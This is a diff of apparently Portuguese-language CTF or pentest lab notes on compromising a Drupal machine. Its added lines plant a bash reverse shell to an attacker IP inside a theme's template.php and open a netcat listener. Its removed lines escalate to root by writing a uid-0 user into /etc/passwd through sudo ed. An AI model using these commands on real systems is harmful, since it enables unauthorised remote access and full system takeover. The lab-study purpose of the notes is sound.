@@ -65,35 +65,20 @@ Entranos no drupal com senha e usuario, ainda não temos acesso root.
 No Drupal vimos a possibilidade de fazer instalação de um theme uppando ele atraves da maquina atacante.
 vai direto no site do drupal baxe o theme que esta no formato php, insira dendtro do template.php o scrip malicioso/backdoor;
 
+add essa linha de scrip no inicio do php 
 exec("/bin/bash -c 'bash -i >& /dev/tcp/ip-maq-ataque/443 0>&1'");
+Salve o arquivo e compacteo novamente.
+faça o upload e instalação do thema no drupal, não mude de thema antes de ativar o nc.
 
+nc -nvlp 443 
+ative o adminstratio theme na qual foi colocado o backdoor.
 
 
 6. Privilege Escalation
 Attempt to escalate privileges from a limited user to root.
 Explore file permissions, configuration files, and environment variables.
 
-(Aqui vimos quais arquivos ele tem aceso como root, neste caso é um editor de texto, vamos usar essa vulnerabilidade para escalar privilegio de root)
-Em outro terminam vamos criar nosso user e senha pra add la no passwd do ssh
 
- openssl passwd -1 -salt zak batata (vamos criar um usuario e senha)
-$1$zak$VbEQapB4mpickfJIMyL1v0
-vamos agora para ssh
-
-sudo /usr/bin/ed  /etc/passwd
-1756
-a
-usuario que vc criou:hash criada pelo openssl:0:0:root:/root:/bin/bash
-.
-w
-1815
-w /etc/passwd
-1815
-q
-
-su usuario que vc criou
-whoami 
-root
 
 
 7. Post-Exploitation
